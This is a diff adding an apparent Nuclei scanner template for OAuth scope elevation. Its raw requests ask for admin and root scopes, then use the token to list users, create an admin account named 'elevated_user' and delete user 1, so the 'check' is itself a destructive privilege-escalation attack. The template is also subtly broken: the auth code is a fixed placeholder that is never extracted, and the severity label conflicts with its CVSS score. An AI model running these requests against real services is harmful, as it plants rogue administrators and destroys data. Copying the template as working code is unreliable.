@@ -1,0 +1,122 @@
+id: medium-api-oauth-scope-elevation-attack
+
+info:
+  name: OAuth Scope Elevation Attack
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects OAuth scope elevation vulnerabilities where applications fail to properly
+    validate requested scopes, allowing attackers to gain elevated privileges by
+    manipulating scope parameters during authorization flow.
+  reference:
+    - https://tools.ietf.org/html/rfc6749#section-3.3
+    - https://portswigger.net/web-security/oauth/grant-types
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 7.6
+    cwe-id: CWE-269
+  tags: oauth,scope,elevation,privilege,authentication,api,medium
+
+http:
+  - raw:
+      - |
+        GET /oauth/authorize?response_type=code&client_id={{client_id}}&redirect_uri={{redirect_uri}}&scope={{elevated_scope}}&state={{state}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        grant_type=authorization_code&client_id={{client_id}}&client_secret={{client_secret}}&code={{auth_code}}&redirect_uri={{redirect_uri}}&scope={{admin_scope}}
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{access_token}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{access_token}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"elevated_user","role":"admin","permissions":["read","write","delete"]}
+
+      - |
+        DELETE /api/admin/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{access_token}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    variables:
+      client_id: "test_client_id"
+      client_secret: "test_client_secret"
+      redirect_uri: "https://example.com/callback"
+      state: "random_state_456"
+      elevated_scope: "read write admin delete super_admin"
+      admin_scope: "admin super_admin root"
+      auth_code: "sample_auth_code"
+
+    extractors:
+      - type: regex
+        name: access_token
+        group: 1
+        regex:
+          - '"access_token":\s*"([^"]+)"'
+        internal: true
+
+      - type: regex
+        name: granted_scope
+        group: 1
+        regex:
+          - '"scope":\s*"([^"]+)"'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"scope":\s*"[^"]*admin[^"]*"'
+          - '"scope":\s*"[^"]*super_admin[^"]*"'
+          - '"scope":\s*"[^"]*delete[^"]*"'
+          - '"permissions":\s*\[[^\]]*"admin"[^\]]*\]'
+          - '"role":\s*"admin"'
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - '"users":\s*\['
+          - '"id":\s*\d+'
+          - '"username":\s*"elevated_user"'
+          - 'deleted.*successfully'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"insufficient_scope"'
+          - '"error":\s*"access_denied"'
+          - 'scope.*not.*authorized'
+          - 'permission.*denied'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-Scope-Validation: strict"
+          - "X-Permission-Check: enabled"
+
+    stop-at-first-match: true
